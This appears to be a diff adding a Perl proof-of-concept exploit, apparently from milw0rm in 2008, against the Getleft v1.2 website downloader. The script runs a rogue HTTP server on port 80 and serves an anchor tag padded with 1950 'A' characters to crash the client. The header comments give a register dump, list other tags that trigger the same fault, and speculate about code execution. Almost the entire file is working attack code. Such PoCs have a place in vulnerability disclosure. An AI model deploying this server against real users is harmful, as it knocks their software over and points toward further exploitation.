@@ -1,0 +1,57 @@
+#!/usr/bin/perl
+#
+# Getleft v1.2.0.0 DoS PoC
+# Author: Koshi
+#
+# Application: Getleft v1.2
+# Publisher: Andres Garcia ( http://personal1.iddeo.es/andresgarci/getleft/english/index.html )
+# Description: Website Downloader, for such things as offline browsing.
+# Tested On: Windows XP SP2
+#
+# Module: Getleft.exe
+# eax=00c5f170 ebx=00000000 ecx=00000000 edx=00000000 esi=00000000 edi=00c5f170
+# eip=004863eb esp=0022d9b0 ebp=010b4870 iopl=0         nv up ei pl nz na po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+#
+# Getleft+0x863eb:
+# 004863eb 8b06            mov     eax,dword ptr [esi]  ds:0023:00000000=????????
+# 
+# <embed src=>, <img src=>, <script src=>, <body background=>
+# Plenty of other tags will work as well. I'm not so sure about
+# code execution, I'll have to try a few other things.
+#
+
+use IO::Socket;
+
+my $body = "<a href=\x22/abcd.jpg\x22>" ."A"x1950 ."</a>";
+my $resp = "".
+	"HTTP/1.1 200 OK\r\n".
+	"Server: Apache\r\n".
+	"Date: Mon, 22 Dec 2008 21:50:46 GMT\r\n".
+	"Content-Type: text/html\r\n".
+	"Accept-Ranges: bytes\r\n".
+	"Last-Modified: Mon, 22 Dec 2008 21:45:46 GMT\r\n".
+	"Content-Length: " .length($body) ."\r\n".
+	"Connection: close\r\n\r\n".
+	"$body\r\n";
+
+for ($i = 2; $i >= 1; $i--) {
+
+my $sock = new IO::Socket::INET (LocalPort => '80',
+				 Proto => 'tcp',
+				 Listen => 1,
+				 Reuse => 1, );
+
+print "Listening...\n";
+my $new_sock = $sock->accept();
+print "Connected...\n";
+my $sock_addr = recv($new_sock,$msg,190,0);
+print "Sending ...\n";
+print $new_sock "$resp";
+print "Sent!\n";
+close($sock);
+print "Closed.\r\n\r\n";
+
+}
+
+# milw0rm.com [2008-12-23]
